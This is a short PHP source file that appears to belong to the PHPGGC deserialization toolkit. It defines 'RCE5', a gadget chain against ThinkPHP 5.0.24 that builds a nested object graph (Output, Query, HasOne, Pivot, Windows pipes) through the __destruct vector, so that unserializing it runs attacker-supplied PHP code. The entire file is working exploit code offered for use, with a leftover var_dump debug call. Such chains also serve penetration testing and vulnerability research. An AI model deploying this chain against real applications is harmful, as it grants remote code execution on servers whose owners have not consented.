<?php

namespace GadgetChain\ThinkPHP;

class RCE5 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '5.0.24';
    public static $vector = '__destruct';
    public static $author = 'gml';

    public function generate(array $parameters)
    {
        $Output = new \think\console\Output($parameters['code']);
        $model = new \think\db\Query($Output);
        $HasOne = new \think\model\relation\HasOne($model);
        $window = new \think\process\pipes\Windows(new \think\model\Pivot($Output, $HasOne));
		var_dump($window);
        return $window;
    }
}